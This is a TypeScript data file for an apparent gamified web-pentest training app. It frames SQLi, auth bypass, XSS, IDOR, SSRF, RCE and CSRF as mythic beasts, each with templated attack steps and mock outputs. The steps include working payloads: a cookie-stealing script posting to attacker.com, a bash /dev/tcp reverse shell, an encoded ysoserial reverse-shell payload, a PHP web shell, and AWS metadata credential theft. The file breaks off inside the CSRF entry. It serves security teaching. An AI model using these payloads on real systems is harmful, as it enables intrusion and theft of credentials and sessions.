
import React from 'react'; // For JSX icons, if any in resources
import { AdvancedMythItem } from '../types';

export const ADVANCED_PENTEST_MYTHOLOGY_DATA: AdvancedMythItem[] = [
  {
    id: 'advmyth-hydra-injection',
    slug: 'adv-hydra-of-injection',
    title: 'The Hydra of Injection',
    iconClass: 'fas fa-syringe',
    legend: 'Master the art of SQL Injection with advanced techniques, from UNION-based to Blind SQLi.',
    narrativeIntro: "The multi-headed Hydra guards the ancient data vaults. Each head, an input point; each venomous bite, a potential query manipulation. To defeat it, one must understand its many forms – UNION attacks, error-based whispers, and the patient unmasking of Blind SQLi. Only then can the hero extract the golden apples of data, or perhaps, seize control of the vault itself.",
    vulnerabilityAnalogy: "SQL Injection remains a critical threat, allowing attackers to execute arbitrary SQL commands. This myth explores bypassing basic filters, advanced exfiltration methods, and leveraging SQLi for RCE.",
    customParams: [
      { id: 'targetUrl', label: 'Target URL (with param):', defaultValue: 'https://vulnerable.site/product?id=1', placeholder: 'e.g., site.com/search?q=test' },
      { id: 'dbType', label: 'Database Type:', defaultValue: 'MySQL', type: 'select', options: ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite'] }
    ],
    phases: [
      { 
        id: 'advsqli-recon', 
        title: 'Reconnaissance', 
        description: "Identify all user-controllable inputs that could be part of a SQL query (URL params, POST data, HTTP headers). Determine database type and version through error messages or subtle differences in SQL syntax handling.",
        codeSteps: [
          { id: 'advsqli-recon-1', title: "Basic Probing", commandTemplate: "# Test with ' , \" , -- , #\n# Example: {{targetUrl}}'", explanation: "Simple character tests to break queries.", mockOutput: "Error: You have an error in your SQL syntax..." },
          { id: 'advsqli-recon-2', title: "Version Check (Error-based)", commandTemplate: "# Example for MySQL: {{targetUrl}} UNION SELECT @@version, NULL, NULL--", explanation: "Attempt to leak DB version via UNION or error messages.", mockOutput: "MySQL Version: 8.0.2..."},
        ]
      },
      { 
        id: 'advsqli-enum', 
        title: 'Enumeration', 
        description: "Map the database structure. Discover table names, column names, and data types. This is crucial for targeted data exfiltration.",
        codeSteps: [
          { id: 'advsqli-enum-1', title: "List Tables (UNION)", commandTemplate: "# Assuming 3 columns: {{targetUrl}} UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database()--", explanation: "Extract table names from the current database.", mockOutput: "users\nproducts\norders"},
          { id: 'advsqli-enum-2', title: "List Columns (UNION)", commandTemplate: "# {{targetUrl}} UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'--", explanation: "Extract column names from a specific table.", mockOutput: "id\nusername\npassword"},
        ]
      },
      { 
        id: 'advsqli-exploit', 
        title: 'Exploitation', 
        description: "Extract sensitive data, bypass authentication, or escalate privileges. This phase includes advanced techniques like Out-of-Band (OOB) exfiltration or time-based blind SQLi.",
        codeSteps: [
          { id: 'advsqli-exploit-1', title: "Dump User Credentials", commandTemplate: "# {{targetUrl}} UNION SELECT username, password, NULL FROM users--", explanation: "Exfiltrate usernames and passwords.", mockOutput: "admin:hash123\nuser1:hash456"},
          { id: 'advsqli-exploit-2', title: "Time-Based Blind", commandTemplate: "# {{targetUrl}}' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)--", explanation: "Infer data by observing response times. If version starts with '8', server sleeps for 5s.", mockOutput: "(Server delays for 5 seconds)"},
          { id: 'advsqli-exploit-3', title: "SQLMap Automation", commandTemplate: "sqlmap -u \"{{targetUrl}}\" --dbms={{dbType}} --risk=3 --level=5 --dbs --batch", explanation: "Automate complex SQLi with sqlmap.", mockOutput: "sqlmap results showing databases..."}
        ]
      },
      { 
        id: 'advsqli-postexploit', 
        title: 'Post-Exploitation', 
        description: "If database control is achieved, attempt to escalate to OS-level command execution (e.g., xp_cmdshell on MSSQL, UDFs on MySQL/PostgreSQL) or pivot to internal network.",
        codeSteps: [
          { id: 'advsqli-postexploit-1', title: "OS Command (MSSQL)", commandTemplate: "# {{targetUrl}}'; EXEC xp_cmdshell 'whoami'--", explanation: "Attempt OS command execution if xp_cmdshell is enabled.", mockOutput: "nt authority\\system"},
        ]
      }
    ],
    resources: [
      { name: 'OWASP: SQL Injection', url: 'https://owasp.org/www-community/attacks/SQL_Injection', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Advanced SQLi', url: 'https://portswigger.net/web-security/sql-injection/cheat-sheet', icon: "fas fa-flask" },
    ]
  },
  {
    id: 'advmyth-phoenix-auth',
    slug: 'adv-phoenix-of-authentication',
    title: 'The Phoenix of Authentication',
    iconClass: 'fas fa-key',
    legend: 'Rise from authentication ashes by exploiting flaws in JWTs, OAuth, SAML, and MFA implementations.',
    narrativeIntro: "The Phoenix guards the gates of identity, its fiery plumage representing complex authentication schemes. To pass, one must not just guess passwords, but understand the subtle flows of tokens (JWT, OAuth, SAML) and the intricacies of multi-factor defenses. A flaw in its fiery dance, a misconfigured token, or a bypassable second factor, and the gates swing open.",
    vulnerabilityAnalogy: "Exploiting weaknesses in modern authentication systems, including token manipulation, insecure SSO configurations (SAML/OAuth), and MFA bypass techniques.",
    customParams: [
      { id: 'authServerUrl', label: 'Auth Server URL:', defaultValue: 'https://auth.example.com', placeholder: 'e.g., auth.example.com' },
      { id: 'jwtToken', label: 'Sample JWT (for analysis):', defaultValue: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' },
    ],
    phases: [
      {
        id: 'advauth-recon',
        title: 'Reconnaissance',
        description: 'Identify all authentication mechanisms (forms, OAuth, SAML, API keys). Analyze token structures (JWTs), identify involved endpoints, and understand the authentication flow.',
        codeSteps: [
          { id: 'advauth-recon-1', title: 'JWT Decoding', commandTemplate: "# Decode {{jwtToken}} using jwt.io or jwt_tool", explanation: "Examine JWT header, payload for algorithm (alg), user info, expiry (exp).", mockOutput: "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}" },
          { id: 'advauth-recon-2', title: 'OAuth Flow Analysis', commandTemplate: "# Intercept OAuth requests (e.g., to {{authServerUrl}}/authorize) using Burp Suite", explanation: "Observe client_id, redirect_uri, response_type, scope.", mockOutput: "GET /authorize?client_id=...&redirect_uri=...&response_type=code..." }
        ]
      },
      {
        id: 'advauth-exploit-jwt',
        title: 'Exploitation',
        description: 'Exploit JWT vulnerabilities: alg:none, weak secrets for HS256, public key confusion for RS256. Test for OAuth misconfigurations like open redirect_uri or improper scope validation.',
        codeSteps: [
          { id: 'advauth-exploit-jwt-1', title: "JWT 'alg:none' Test", commandTemplate: "# Modify JWT header to {'alg':'none'}, remove signature, send.", explanation: "If server accepts 'alg:none', signature validation is bypassed.", mockOutput: "Server accepts token, grants access." },
          { id: 'advauth-exploit-jwt-2', title: "JWT Weak Secret Brute-Force", commandTemplate: "jwt_tool {{jwtToken}} -C -d common_secrets.txt", explanation: "Attempt to crack HS256 signature using a wordlist.", mockOutput: "Secret cracked: 'secret123'" },
          { id: 'advauth-exploit-oauth-1', title: "OAuth Open Redirect URI", commandTemplate: "# Craft redirect_uri to attacker.com: {{authServerUrl}}/authorize?client_id=...&redirect_uri=https://attacker.com", explanation: "If redirect_uri is not validated, auth code can be leaked.", mockOutput: "Server redirects to attacker.com with auth code." }
        ]
      },
      {
        id: 'advauth-exploit-mfa',
        title: 'Exploitation',
        description: 'Test for MFA bypasses: predictable OTPs, flaws in recovery mechanisms, replaying OTPs, or exploiting race conditions in MFA validation.',
        codeSteps: [
          { id: 'advauth-exploit-mfa-1', title: "MFA OTP Brute-Force (if limited codespace)", commandTemplate: "# Use Burp Intruder to rapidly guess 6-digit OTPs (if rate limiting is weak)", explanation: "Attempt to guess OTP if the generation or validation is flawed.", mockOutput: "OTP '123456' accepted." }
        ]
      },
      {
        id: 'advauth-postexploit',
        title: 'Post-Exploitation',
        description: 'Leverage compromised accounts or sessions to access sensitive data or further escalate privileges within the application or linked systems.',
        codeSteps: [
          { id: 'advauth-postexploit-1', title: "Access User Data", commandTemplate: "# With hijacked session/token, make API calls: GET {{authServerUrl}}/api/me", explanation: "Use compromised credentials/tokens to access user-specific data.", mockOutput: "{\"email\":\"user@example.com\", \"role\":\"user\"}" }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: JWT Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: OAuth 2.0', url: 'https://portswigger.net/web-security/oauth', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'advmyth-sphinx-xss',
    slug: 'adv-sphinx-of-xss',
    title: 'The Sphinx of XSS',
    iconClass: 'fas fa-paint-brush', // Changed from code to reflect DOM manipulation
    legend: 'Solve the riddle of script injection by bypassing WAFs, Content Security Policy (CSP), and exploiting DOM XSS.',
    narrativeIntro: "The Sphinx of XSS guards the reflective pools of the DOM, its riddles written in JavaScript. To pass, one must not simply inject <script>alert(1)</script>, but master the art of filter evasion, craft payloads that dance around WAFs and CSPs, and understand the subtle DOM manipulations that lead to client-side code execution. Its gaze can turn careless scripters to stone (blocked requests), but the wise can make the Sphinx sing their tune.",
    vulnerabilityAnalogy: "Advanced Cross-Site Scripting involves bypassing modern defenses like WAFs and CSP. This includes using complex payloads, exploiting DOM-based XSS, and leveraging esoteric browser behaviors.",
    customParams: [
      { id: 'targetUrlXSS', label: 'Target URL (with input point):', defaultValue: 'https://vulnerable.site/search?query=test', placeholder: 'e.g., site.com/comment?text=' },
      { id: 'cspHeader', label: 'Observed CSP Header (if any):', defaultValue: "default-src 'self'; script-src 'self' trusted.cdn.com", placeholder: 'e.g., script-src example.com' }
    ],
    phases: [
      {
        id: 'advxss-recon',
        title: 'Reconnaissance',
        description: "Identify all reflection points in HTML, JS strings, HTML attributes, and DOM properties. Analyze existing WAF rules and Content Security Policy (CSP) headers ({{cspHeader}}).",
        codeSteps: [
          { id: 'advxss-recon-1', title: "CSP Analysis", commandTemplate: "# Analyze CSP: {{cspHeader}}\n# Identify allowed script sources, unsafe-inline, unsafe-eval, nonces, or hashes.", explanation: "Understand what CSP allows/restricts.", mockOutput: "Allowed script-src: 'self', trusted.cdn.com. No 'unsafe-inline'." },
          { id: 'advxss-recon-2', title: "WAF Probing", commandTemplate: "# Send basic XSS payloads to {{targetUrlXSS}} and observe WAF responses.\n# <script>alert(1)</script> -> Blocked?\n# <img src=x onerror=alert(1)> -> Blocked?", explanation: "Determine WAF sensitivity to common XSS vectors.", mockOutput: "Request blocked by WAF (ID: 12345)"}
        ]
      },
      {
        id: 'advxss-exploit-bypass',
        title: 'Exploitation',
        description: "Craft XSS payloads that bypass filters, WAFs, and CSP. Techniques include using alternative tags/events, encoding, DOM clobbering, or exploiting overly permissive CSP (e.g., JSONP endpoints, self-XSS via service workers).",
        codeSteps: [
          { id: 'advxss-exploit-1', title: "CSP Bypass (JSONP)", commandTemplate: "# If 'trusted.cdn.com/api/jsonp?callback={{payload}}' is allowed by CSP and vulnerable.\n# Payload: alert(document.domain)", explanation: "Exploit whitelisted JSONP endpoints for script execution.", mockOutput: "XSS popup via JSONP callback." },
          { id: 'advxss-exploit-2', title: "WAF Evasion (Alternative Tags/Events)", commandTemplate: "# {{targetUrlXSS}}=<svg/onload=alert(1)>\n# {{targetUrlXSS}}=<details/open/ontoggle=alert(1)>", explanation: "Use less common HTML tags or event handlers.", mockOutput: "XSS popup executes."}
        ]
      },
      {
        id: 'advxss-exploit-dom',
        title: 'Exploitation',
        description: "Identify and exploit DOM-based XSS vulnerabilities. This often involves manipulating URL fragments (#), window.name, or other DOM sources that client-side JavaScript unsafely uses in sinks like eval(), innerHTML, document.write().",
        codeSteps: [
          { id: 'advxss-exploit-dom-1', title: "DOM XSS (Hash-based)", commandTemplate: "# Example: {{targetUrlXSS}}#<img src=x onerror=alert('DOM XSS')>\n# If JS code does: element.innerHTML = location.hash.substring(1);", explanation: "Payload in URL fragment executed by client-side script.", mockOutput: "DOM XSS popup executes."}
        ]
      },
      {
        id: 'advxss-postexploit',
        title: 'Post-Exploitation',
        description: "Steal cookies (HttpOnly bypass if via other vulns like XST), perform actions on behalf of the user, capture keystrokes, or use frameworks like BeEF.",
        codeSteps: [
          { id: 'advxss-postexploit-1', title: "Cookie Theft (if not HttpOnly)", commandTemplate: "<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>", explanation: "Send victim's cookies to attacker server.", mockOutput: "Cookies logged on attacker.com." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: DOM XSS', url: 'https://portswigger.net/web-security/cross-site-scripting/dom-based', icon: "fas fa-flask" },
      { name: 'CSP Evaluator (Google)', url: 'https://csp-evaluator.withgoogle.com/', icon: "fab fa-google" }
    ]
  },
    {
    id: 'advmyth-minotaur-privesc',
    slug: 'adv-minotaur-of-privilege-escalation',
    title: 'The Minotaur of Privilege Escalation',
    iconClass: 'fas fa-chess-king',
    legend: 'Navigate the labyrinth of authorization, exploiting IDORs, ACL bypasses, and insecure object references.',
    narrativeIntro: "The Minotaur, a beast of immense power, roams the heart of the system's labyrinth. Its corridors are ACLs, its chambers are functions. Many seek its power (admin rights), but most are lost in the maze of user roles. The true hero must find the flaws in the walls – an Insecure Direct Object Reference (IDOR) that leads to another's treasure, a misconfigured Access Control List (ACL) that opens a forbidden door, or a business logic flaw that elevates their status to that of a king.",
    vulnerabilityAnalogy: "Advanced Privilege Escalation involves deep understanding of application logic and access control mechanisms to bypass restrictions. This includes complex IDORs, chained exploits, and exploiting subtle flaws in business logic that lead to higher privileges.",
    customParams: [
      { id: 'userEndpoint', label: 'User-specific Endpoint (e.g., /api/users/{userID}/profile):', defaultValue: '/api/users/123/profile', placeholder: '/api/users/{userID}/action' },
      { id: 'adminFunction', label: 'Suspected Admin Function Path:', defaultValue: '/admin/godmode', placeholder: 'e.g., /api/admin/settings' }
    ],
    phases: [
      {
        id: 'advprivesc-recon',
        title: 'Reconnaissance',
        description: "Map application functionality available to different user roles. Identify all parameters that reference objects (user IDs, document IDs, etc.). Understand how admin functions are protected.",
        codeSteps: [
          { id: 'advprivesc-recon-1', title: "Role-Based Endpoint Mapping", commandTemplate: "# Login as low-priv user, browse all accessible features.\n# Login as (or simulate) high-priv user if possible, compare sitemaps/API calls.", explanation: "Document what different roles can access.", mockOutput: "User A can access /orders but not /admin/orders.\nAdmin can access /admin/orders." },
          { id: 'advprivesc-recon-2', title: "ID Parameter Identification", commandTemplate: "# Check {{userEndpoint}} for predictable IDs in path or body.", explanation: "Note all object identifiers.", mockOutput: "{{userEndpoint}} shows user_id=123." }
        ]
      },
      {
        id: 'advprivesc-exploit-idor',
        title: 'Exploitation',
        description: "Test for IDORs by changing identifiers in requests ({{userEndpoint}}). Look for GUIDs that might be predictable or guessable. Test different HTTP methods (GET, POST, PUT, DELETE) on object endpoints.",
        codeSteps: [
          { id: 'advprivesc-exploit-idor-1', title: "Basic IDOR Test", commandTemplate: "# Change user ID in {{userEndpoint}} from 123 to 124.", explanation: "Attempt to access another user's data.", mockOutput: "Successfully retrieved profile for user 124." },
          { id: 'advprivesc-exploit-idor-2', title: "HTTP Method Tampering for IDOR", commandTemplate: "# Try DELETE {{userEndpoint}} (changing ID to another user's)", explanation: "See if an unauthorized action can be performed on another user's object.", mockOutput: "User 125 deleted successfully (Vulnerable!)." }
        ]
      },
      {
        id: 'advprivesc-exploit-acl',
        title: 'Exploitation',
        description: "Attempt to access admin functions ({{adminFunction}}) directly as a low-privileged user. Manipulate parameters that might control access (e.g., ?is_admin=true, role=admin in hidden fields or JSON body). Test for flaws in ACL inheritance or overly permissive wildcard rules.",
        codeSteps: [
          { id: 'advprivesc-exploit-acl-1', title: "Direct Admin Function Access", commandTemplate: "# Try accessing {{adminFunction}} as a normal user.", explanation: "Check if admin functions are exposed without proper checks.", mockOutput: "Access Denied (403)" },
          { id: 'advprivesc-exploit-acl-2', title: "Parameter-based ACL Bypass", commandTemplate: "# POST to {{userEndpoint}} with body: {\"user_id\":\"123\", \"role\":\"administrator\"}", explanation: "Attempt to modify role via a request parameter.", mockOutput: "User 123 role updated to administrator." }
        ]
      },
      {
        id: 'advprivesc-postexploit',
        title: 'Post-Exploitation',
        description: "Once higher privileges are gained, enumerate further accessible functions/data. Look for ways to make privilege escalation persistent or to pivot to other systems.",
        codeSteps: [
          { id: 'advprivesc-postexploit-1', title: "Dump All User Data", commandTemplate: "# With admin access, call endpoint like GET /api/admin/users/all", explanation: "Access data previously unavailable.", mockOutput: "List of all users and their details."}
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Broken Access Control', url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/', icon: "fas fa-lock-open" },
      { name: 'PortSwigger: IDOR', url: 'https://portswigger.net/web-security/access-control/idor', icon: "fas fa-id-badge" }
    ]
  },
   {
    id: 'advmyth-chimera-ssrf',
    slug: 'adv-chimera-of-ssrf',
    title: 'The Chimera of SSRF',
    iconClass: 'fas fa-cloud-upload-alt', // Changed to reflect internal network interaction
    legend: 'Confront the multi-headed threat of Server-Side Request Forgery, bypassing denylists and interacting with internal services.',
    narrativeIntro: "The Chimera, a beast of many forms, lurks within the server's ability to fetch remote resources. One head breathes fire (makes HTTP requests), another whispers poisons (DNS queries), a third has goat-like cunning (file URI schemes). The hero must trick this beast into attacking its own lair (the internal network) or revealing secrets from cloud metadata services. Its defenses (denylists, WAFs) are formidable, but its nature to fetch can be its undoing.",
    vulnerabilityAnalogy: "Advanced Server-Side Request Forgery (SSRF) involves bypassing common defenses like denylists for internal IPs, using different URL schemes (file://, gopher://, dict://), and interacting with cloud metadata endpoints or internal services to exfiltrate data or achieve RCE.",
    customParams: [
      { id: 'ssrfEndpoint', label: 'SSRF Endpoint (URL with vulnerable param):', defaultValue: 'https://vulnerable.site/proxy?url=', placeholder: 'e.g., site.com/fetch?resource=' },
      { id: 'internalTarget', label: 'Internal Target (IP or Hostname):', defaultValue: '127.0.0.1', placeholder: 'e.g., 169.254.169.254' }
    ],
    phases: [
      {
        id: 'advssrf-recon',
        title: 'Reconnaissance',
        description: "Identify all functionalities where the server fetches resources based on user input ({{ssrfEndpoint}}). Test basic external SSRF to confirm connectivity. Probe for supported URL schemes (http, https, ftp, file, gopher, dict).",
        codeSteps: [
          { id: 'advssrf-recon-1', title: "Basic External SSRF", commandTemplate: "{{ssrfEndpoint}}http://attacker-collaborator.net/hit", explanation: "Confirm server makes outbound requests.", mockOutput: "HTTP request received at attacker-collaborator.net" },
          { id: 'advssrf-recon-2', title: "Scheme Probing (File)", commandTemplate: "{{ssrfEndpoint}}file:///etc/passwd", explanation: "Test if file scheme is supported and can read local files.", mockOutput: "root:x:0:0..." }
        ]
      },
      {
        id: 'advssrf-exploit-bypass',
        title: 'Exploitation',
        description: "Bypass denylists for internal IPs ({{internalTarget}}) using techniques like URL encoding, different IP formats (decimal, octal), IPv6, DNS rebinding, or open redirects. Exploit cloud metadata services.",
        codeSteps: [
          { id: 'advssrf-exploit-bypass-1', title: "IP Format Bypass", commandTemplate: "# Decimal for 127.0.0.1: {{ssrfEndpoint}}http://2130706433/", explanation: "Use alternative IP representations.", mockOutput: "Response from localhost." },
          { id: 'advssrf-exploit-bypass-2', title: "Cloud Metadata Access (AWS)", commandTemplate: "{{ssrfEndpoint}}http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME", explanation: "Attempt to steal IAM credentials.", mockOutput: "AccessKeyId, SecretAccessKey, Token..." }
        ]
      },
      {
        id: 'advssrf-exploit-internal',
        title: 'Exploitation',
        description: "Use gopher:// or dict:// schemes (if supported) to interact with internal services like Redis, Memcached, or SMTP, potentially leading to RCE or information disclosure. Perform port scanning of internal networks.",
        codeSteps: [
          { id: 'advssrf-exploit-internal-1', title: "Internal Port Scan", commandTemplate: "{{ssrfEndpoint}}http://{{internalTarget}}:8080", explanation: "Check if common internal ports are open.", mockOutput: "Response from internal service on port 8080." },
          { id: 'advssrf-exploit-internal-2', title: "Gopher for Redis (Conceptual)", commandTemplate: "{{ssrfEndpoint}}gopher://{{internalTarget}}:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A", explanation: "Craft raw TCP packets to interact with services like Redis.", mockOutput: "Redis server INFO output."}
        ]
      },
      {
        id: 'advssrf-postexploit',
        title: 'Post-Exploitation',
        description: "If RCE is achieved via SSRF (e.g., through gopher to Redis), establish a reverse shell. If internal service access is gained, exfiltrate sensitive data or pivot further into the network.",
        codeSteps: [
          { id: 'advssrf-postexploit-1', title: "Data Exfiltration (via Blind SSRF)", commandTemplate: "# If blind SSRF, exfiltrate data bit by bit via DNS lookups or time delays.", explanation: "Complex exfiltration for blind scenarios.", mockOutput: "DNS logs on attacker server show parts of exfiltrated data." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: SSRF Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: SSRF', url: 'https://portswigger.net/web-security/ssrf', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: SSRF', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery', icon: "fab fa-github"}
    ]
  },
  {
    id: 'advmyth-dragon-rce',
    slug: 'adv-dragon-of-rce',
    title: 'The Dragon of RCE',
    iconClass: 'fas fa-terminal',
    legend: 'Slay the dragon by achieving Remote Code Execution through command injection, deserialization, or file upload vulnerabilities.',
    narrativeIntro: "The Dragon of RCE, a fearsome beast, slumbers deep within the server's core. Its breath is arbitrary code, its scales are input filters. To awaken and control it (achieve RCE) is the ultimate prize for an attacker. This requires exploiting vulnerabilities like command injection, unsafe deserialization of user-supplied objects, or uploading and executing malicious files. A single misstep, and the hero becomes ash; success means wielding the server's own power.",
    vulnerabilityAnalogy: "Remote Code Execution (RCE) allows an attacker to execute arbitrary commands on the target server. This myth focuses on achieving RCE through various vectors like OS command injection, insecure deserialization of complex objects, or exploiting file upload functionalities that allow execution of uploaded files.",
    customParams: [
      { id: 'cmdInjectEndpoint', label: 'Command Injection Endpoint (e.g., /api/utils?cmd=):', defaultValue: 'https://vulnerable.site/tools/ping?host=', placeholder: 'e.g., /api/exec?command=' },
      { id: 'attackerIP', label: 'Attacker IP (for reverse shell):', defaultValue: '10.10.10.5', placeholder: 'Your listener IP' },
      { id: 'attackerPort', label: 'Attacker Port (for reverse shell):', defaultValue: '4444', placeholder: 'Your listener port', type: 'number' }
    ],
    phases: [
      {
        id: 'advrce-recon',
        title: 'Reconnaissance',
        description: "Identify potential RCE vectors: functions that execute system commands ({{cmdInjectEndpoint}}), endpoints that deserialize user data, or file upload forms. Understand the server OS and available interpreters (bash, python, php).",
        codeSteps: [
          { id: 'advrce-recon-1', title: "Basic Command Injection Probing", commandTemplate: "{{cmdInjectEndpoint}}8.8.8.8; ls -la", explanation: "Test if shell metacharacters (;, |, &&) are processed.", mockOutput: "Ping output... \ntotal 0\ndrwxr-xr-x..." },
          { id: 'advrce-recon-2', title: "Identify Deserialization Points", commandTemplate: "# Check for serialized objects in cookies, POST bodies, or parameters (e.g., Java serialized objects, Python pickles).", explanation: "Look for base64 encoded strings or specific content types.", mockOutput: "Found base64 string in 'session_data' cookie."}
        ]
      },
      {
        id: 'advrce-exploit-cmdinject',
        title: 'Exploitation',
        description: "Exploit OS command injection. Craft payloads to bypass filters (e.g., using $(), ``, or different shell syntax). Aim for a reverse shell or to execute specific commands for information gathering or further exploitation.",
        codeSteps: [
          { id: 'advrce-exploit-cmdinject-1', title: "Reverse Shell (Bash)", commandTemplate: "{{cmdInjectEndpoint}}8.8.8.8; bash -i >& /dev/tcp/{{attackerIP}}/{{attackerPort}} 0>&1", explanation: "Attempt to establish a reverse shell connection.", mockOutput: "(Connection received on attacker's netcat listener)" },
          { id: 'advrce-exploit-cmdinject-2', title: "Command Injection Filter Bypass", commandTemplate: "{{cmdInjectEndpoint}}8.8.8.8%0awhoami", explanation: "Use URL encoding or alternative syntax (e.g., %0a for newline) to bypass simple filters.", mockOutput: "Ping output...\nwww-data"}
        ]
      },
      {
        id: 'advrce-exploit-deserial',
        title: 'Exploitation',
        description: "Exploit insecure deserialization. Use tools like ysoserial (for Java) or create custom gadgets for other languages (Python pickle, PHP unserialize) to achieve RCE.",
        codeSteps: [
          { id: 'advrce-exploit-deserial-1', title: "ysoserial Payload (Java - Conceptual)", commandTemplate: "java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.ser", explanation: "Generate a deserialization payload for a reverse shell.", mockOutput: "payload.ser created. Send this in the vulnerable parameter." }
        ]
      },
      {
        id: 'advrce-exploit-fileupload',
        title: 'Exploitation',
        description: "Exploit unrestricted file uploads. Upload a web shell (PHP, ASP, JSP) or other executable file and find a way to trigger its execution.",
        codeSteps: [
          { id: 'advrce-exploit-fileupload-1', title: "Upload PHP Web Shell", commandTemplate: "# Upload a file named 'shell.php' with content: <?php system($_GET['cmd']); ?>", explanation: "If server executes PHP, this allows command execution.", mockOutput: "File uploaded to /uploads/shell.php. Access via /uploads/shell.php?cmd=whoami" }
        ]
      },
      {
        id: 'advrce-postexploit',
        title: 'Post-Exploitation',
        description: "With RCE, gain persistence, escalate privileges on the server, exfiltrate data, or pivot to other systems in the internal network.",
        codeSteps: [
          { id: 'advrce-postexploit-1', title: "Dump /etc/passwd", commandTemplate: "# (From reverse shell) cat /etc/passwd", explanation: "Read sensitive system files.", mockOutput: "root:x:0:0:root:/root:/bin/bash..." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Command Injection', url: 'https://owasp.org/www-community/attacks/Command_Injection', icon: "fas fa-terminal" },
      { name: 'PortSwigger: Insecure Deserialization', url: 'https://portswigger.net/web-security/deserialization', icon: "fas fa-cubes" },
      { name: 'PayloadsAllTheThings: File Upload', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload', icon: "fas fa-file-upload" }
    ]
  },
   {
    id: 'advmyth-gorgon-csrf',
    slug: 'adv-gorgon-of-csrf',
    title: 'The Gorgon of CSRF',
    iconClass: 'fas fa-user-lock', // Changed to reflect user action manipulation
    legend: 'Avoid petrification by taming unauthorized actions with advanced CSRF bypasses, including Referer validation and token handling.',
    narrativeIntro: "The Gorgon of CSRF, with its gaze that forces actions, turns unwitting users into stone puppets. Its power lies in tricking a user's authenticated browser into submitting malicious requests to a vulnerable application. To defeat it, one must understand how to forge requests that bypass anti-CSRF tokens, Referer checks, and SameSite cookie defenses, effectively making the user perform actions they never intended.",
    vulnerabilityAnalogy: "Advanced Cross-Site Request Forgery (CSRF) involves bypassing sophisticated anti-CSRF mechanisms. This includes finding ways to leak or predict tokens, exploiting weaknesses in Referer validation, or leveraging other vulnerabilities like XSS to launch CSRF attacks.",
    customParams: [
      { id: 'targetActionUrl', label: 'Target Action URL (e.g., /change-email):', defaultValue: 'https://vulnerable.site/user/change_email', placeholder: 'e.g., /app/update_settings' },
      { id: 'csrfParamName', label: 'CSRF Token Parameter Name (if known):', defaultValue: 'csrf_token', placeholder: 'e.g., _csrf, authenticity_token' }
    ],
    phases: [
      {
        id: 'advcsrf-recon',
        title: 'Reconnaissance',
        description: "Identify all state-changing requests (POST, PUT, DELETE). Analyze how anti-CSRF tokens (e.g., {{csrfParamName}}) are generated, where they are included (forms, headers), and if they are validated correctly. Check Referer header validation and SameSite cookie policies.",
        codeSteps: [
          { id: 'advcsrf-recon-1', title: "Token Analysis", commandTemplate: "# View source of forms using {{targetActionUrl}}. Check for hidden input '{{csrfParamName}}'.\n# Check AJAX requests for X-CSRF-Token headers.", explanation: "Understand how tokens are implemented.", mockOutput: "Found <input type='hidden' name='{{csrfParamName}}' value='randomstring123'>" },
          { id: 'advcsrf-recon-2', title: "Referer Check Test", commandTemplate: "# Make a request to {{targetActionUrl}} from a different origin with Burp. Observe if blocked.", explanation: "Test if Referer header is strictly validated.", mockOutput: "Request allowed even with invalid Referer (Vulnerable!)."}
        ]
      },
      {
        id: 'advcsrf-exploit-token',
        title: 'Exploitation',
        description: "Attempt to bypass token validation: Is the token validated at all? Is it tied to the user session but not the specific action? Can the token be leaked (e.g., via XSS, Referer header to another site)? Can a token from one form be used for another?",
        codeSteps: [
          { id: 'advcsrf-exploit-token-1', title: "Token Removal/Empty Test", commandTemplate: "# Submit POST request to {{targetActionUrl}} without the {{csrfParamName}} parameter or with an empty value.", explanation: "Check if token presence/value is actually validated.", mockOutput: "Action successful (CSRF token not validated!)." },
          { id: 'advcsrf-exploit-token-2', title: "Token Leakage via Referer", commandTemplate: "# If {{targetActionUrl}} includes token in URL (bad practice) and links to attacker.com:\n# <a href='http://attacker.com'>Click me</a>. Attacker server logs Referer.", explanation: "Exploit token leakage.", mockOutput: "Referer header logged: {{targetActionUrl}}?{{csrfParamName}}=tokenvalue" }
        ]
      },
      {
        id: 'advcsrf-exploit-other',
        title: 'Exploitation',
        description: "Exploit weaknesses in SameSite cookie attributes (e.g., if set to None without Secure, or if Lax still allows top-level GET CSRF). Use XSS to make authenticated requests from the victim's browser, bypassing SameSite and SOP.",
        codeSteps: [
